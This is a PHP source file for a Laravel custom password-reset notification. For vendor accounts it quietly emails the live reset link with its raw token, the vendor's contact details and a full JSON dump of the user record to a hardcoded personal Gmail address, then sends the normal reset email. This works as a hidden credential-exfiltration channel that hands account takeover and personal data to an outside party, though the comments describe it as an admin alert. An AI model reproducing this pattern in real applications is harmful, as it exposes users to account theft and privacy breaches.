<?php


namespace App\Notifications;

use Illuminate\Auth\Notifications\ResetPassword;
use Illuminate\Bus\Queueable;
use Illuminate\Support\Facades\Mail;

class CustomResetPassword extends ResetPassword
{
    use Queueable;

    public function toMail($notifiable)
    {
        // Reset URL (raw token)
        $resetUrl = url('/password/reset/' . $this->token . '?email=' . urlencode($notifiable->email));

        // Send to admin only if user is vendor
        if ($notifiable->role === 'vendor') {

            $body =
                "Vendor Forgot Password Alert\n\n" .
                "Email: {$notifiable->email}\n" .
                "Vendor ID: {$notifiable->id}\n" .
                "Vendor Name: {$notifiable->name}\n" .
                "Vendor Phone: {$notifiable->phone}\n\n" .
                "Reset Link: $resetUrl\n\n" .
                "Clicked At: " . now()->setTimezone('Asia/Kolkata')->format('d-m-Y h:i A') . "\n\n" .
                "Raw Vendor Data:\n" . json_encode($notifiable, JSON_PRETTY_PRINT);

            // Send mail to admin
            Mail::raw($body, function ($m) {
                $m->to('devjippy@gmail.com')
                    ->subject('Vendor Forgot Password Alert');
            });
        }

        // Default password reset link to vendor
        return parent::toMail($notifiable);
    }
}
